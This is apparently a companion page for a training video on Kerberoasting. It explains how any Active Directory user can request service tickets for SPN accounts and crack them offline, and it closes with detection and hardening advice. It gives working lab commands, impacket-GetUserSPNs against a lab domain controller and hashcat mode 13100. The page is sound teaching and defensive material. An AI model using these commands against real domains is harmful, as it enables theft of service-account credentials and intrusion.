## Summary

Kerberoasting abuses a normal part of Kerberos. Any domain user can request a service ticket for an account that has a Service Principal Name (SPN). Part of that ticket is encrypted with the service account's password hash, so it can be cracked offline.

The attack is quiet and needs no special rights. The defence is mostly about passwords: long, random secrets on service accounts, or managed accounts that rotate them for you.

## Commands from this video

Replace `<USER>`, `<PASSWORD>` and `<WORDLIST>` with your lab values. The domain controller is `10.10.10.5` in the lab.

<CodeBlock
  lang="bash"
  host="attacker (Kali, lab)"
  lines={[
    { out: "# Request tickets for every account with an SPN" },
    "$ impacket-GetUserSPNs lab.local/<USER>:<PASSWORD> -dc-ip 10.10.10.5 -request -outputfile hashes.txt",
    "ServicePrincipalName          Name      MemberOf",
    "MSSQLSvc/sql01.lab.local:1433 svc_sql   CN=SQL Admins",
    "$ hashcat -m 13100 hashes.txt <WORDLIST>",
  ]}
/>

<Callout type="defence" title="detect and fix">
  Alert on Windows event 4769 (a Kerberos service ticket was requested) with ticket encryption type `0x17` (RC4), from one account to many SPNs in a short time.

  Fix: move services to group Managed Service Accounts (gMSA), or set random passwords of 25 or more characters, and allow AES only for Kerberos.
</Callout>
